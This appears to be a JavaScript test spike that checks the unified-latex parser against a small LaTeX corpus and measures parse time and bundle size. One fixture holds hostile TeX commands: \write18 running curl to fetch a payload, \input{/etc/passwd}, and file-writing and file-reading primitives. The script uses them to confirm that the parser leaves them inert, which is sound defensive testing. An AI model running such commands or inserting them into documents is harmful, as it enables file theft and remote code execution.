import { gzipSync } from "node:zlib";

import { getParser, parse } from "@unified-latex/unified-latex-util-parse";
import { build } from "esbuild";

const corpus = [
  {
    name: "scholarly prose",
    source: String.raw`\section{Introduction}\label{sec:introduction}
As \citet{one} argues, compare \citep{two,three}. See \autoref{sec:method}.
Text with \textbf{weight}, \emph{emphasis}, and \footnote{A \texttt{nested} note}.`,
  },
  {
    name: "includes and figures",
    source: String.raw`\input{sections/result}
\bibliography{references/web}
\begin{figure}[h]
\includegraphics[width=3cm]{plot}
\caption{Measured result}\label{fig:result}
\end{figure}`,
  },
  {
    name: "lists and table",
    source: String.raw`\begin{enumerate}\item First \item Second\end{enumerate}
\begin{table}\begin{tabular}{cl}
Variant & Score \\
Original & 58 \\
\end{tabular}\end{table}`,
  },
  {
    name: "verbatim and tikz",
    source: String.raw`\begin{lstlisting}[language=JavaScript]
const fence = ${"```"};
\end{lstlisting}
\begin{tikzpicture}\draw (0,0)--(1,1);\end{tikzpicture}
\begin{comment}Hidden draft\end{comment}`,
  },
  {
    name: "math and custom macros",
    source: String.raw`Inline $x_i^2$ and \(y = \frac{1}{2}\).
\newcommand{\projectterm}[1]{\textbf{#1}}
\projectterm{Visible authored term}`,
  },
  {
    name: "inert dangerous primitives",
    source: String.raw`\write18{curl https://example.invalid/payload}
\input{/etc/passwd}
\openout1=/tmp/unified-latex-must-not-write
\read1 to \stolen`,
  },
];

const results = [];
const allMacros = new Set();
const allEnvironments = new Set();
let totalMilliseconds = 0;

for (const fixture of corpus) {
  const startedAt = performance.now();
  const tree = parse(fixture.source);
  const milliseconds = performance.now() - startedAt;
  totalMilliseconds += milliseconds;
  const summary = summarize(tree);
  for (const macro of summary.macros) allMacros.add(macro);
  for (const environment of summary.environments) allEnvironments.add(environment);
  results.push({
    name: fixture.name,
    characters: fixture.source.length,
    milliseconds,
    nodeTypes: summary.nodeTypes,
    macros: summary.macros,
    environments: summary.environments,
  });
}

const scholarlyTree = parse(corpus[0].source);
const defaultArgumentState = macroArgumentState(scholarlyTree);
const kirjolabParser = getParser({
  macros: {
    cite: { signature: "o o m" },
    citep: { signature: "o o m" },
    citet: { signature: "o o m" },
  },
});
const configuredArgumentState = macroArgumentState(kirjolabParser.parse(corpus[0].source));
const customMacroTree = parse(corpus[4].source);
const customMacro = findNodes(customMacroTree, "macro").find((node) => node.content === "projectterm");

function macroArgumentState(tree) {
  const macros = findNodes(tree, "macro");
  return Object.fromEntries(
    ["section", "label", "citet", "citep", "autoref", "textbf", "emph", "footnote"].map((name) => {
      const macro = macros.find((node) => node.content === name);
      return [name, Array.isArray(macro?.args) && macro.args.some((argument) => argument.content?.length > 0)];
    }),
  );
}

const dangerous = summarize(parse(corpus.at(-1).source)).macros;
const parserBundle = await build({
  stdin: {
    contents: 'import { parse } from "@unified-latex/unified-latex-util-parse"; globalThis.parseLatex = parse;',
    resolveDir: process.cwd(),
    sourcefile: "unified-latex-parser-entry.js",
  },
  bundle: true,
  format: "esm",
  minify: true,
  platform: "browser",
  target: "es2022",
  write: false,
});
const output = parserBundle.outputFiles[0];
if (!output) throw new Error("unified-latex spike did not produce a parser bundle");

const checks = [
  {
    name: "bounded corpus parses",
    passed: results.length === corpus.length,
    detail: `${corpus.length} representative sources parsed in ${totalMilliseconds.toFixed(1)} ms.`,
  },
  {
    name: "core environments are structural",
    passed: ["enumerate", "figure", "table", "tabular", "tikzpicture"].every((name) => allEnvironments.has(name)),
    detail: `Recognized environments: ${[...allEnvironments].sort().join(", ")}.`,
  },
  {
    name: "dangerous primitives remain inert syntax",
    passed: ["write", "input", "openout", "read"].every((name) => dangerous.includes(name)),
    detail: "Execution-capable TeX primitives were returned as AST macros; the parser did not execute TeX.",
  },
  {
    name: "Kirjolab citation registry makes arguments structural",
    passed: ["citet", "citep", "autoref"].every((name) => configuredArgumentState[name]),
    detail: `Default: ${JSON.stringify(defaultArgumentState)}. Configured: ${JSON.stringify(configuredArgumentState)}.`,
  },
  {
    name: "runtime macro definitions are not interpreted",
    passed: !Array.isArray(customMacro?.args) || customMacro.args.every((argument) => !argument.content?.length),
    detail: "The parser preserves an unknown macro but does not execute the preceding \\newcommand definition.",
  },
];

console.log(
  JSON.stringify(
    {
      checks,
      corpus: results,
      parserBundle: {
        rawBytes: output.contents.byteLength,
        gzipBytes: gzipSync(output.contents).byteLength,
      },
      adapterEvidence: {
        defaultArgumentState,
        configuredArgumentState,
        macroCount: allMacros.size,
        environmentCount: allEnvironments.size,
        note: "Known citation commands need a Kirjolab registry; runtime-defined macros still require preservation or source-adjacent recovery.",
      },
    },
    null,
    2,
  ),
);

function summarize(root) {
  const nodeTypes = new Set();
  const macros = new Set();
  const environments = new Set();
  visit(root, (node) => {
    nodeTypes.add(node.type);
    if (node.type === "macro" && typeof node.content === "string") macros.add(normalizePrimitive(node.content));
    if (node.type === "environment" && typeof node.env === "string") environments.add(node.env);
  });
  return {
    nodeTypes: [...nodeTypes].sort(),
    macros: [...macros].sort(),
    environments: [...environments].sort(),
  };
}

function findNodes(root, type) {
  const nodes = [];
  visit(root, (node) => {
    if (node.type === type) nodes.push(node);
  });
  return nodes;
}

function visit(value, callback, seen = new Set()) {
  if (!value || typeof value !== "object" || seen.has(value)) return;
  seen.add(value);
  if (typeof value.type === "string") callback(value);
  for (const child of Object.values(value)) {
    if (Array.isArray(child)) {
      for (const item of child) visit(item, callback, seen);
    } else {
      visit(child, callback, seen);
    }
  }
}

function normalizePrimitive(name) {
  if (name.startsWith("write")) return "write";
  if (name.startsWith("openout")) return "openout";
  if (name.startsWith("read")) return "read";
  return name;
}
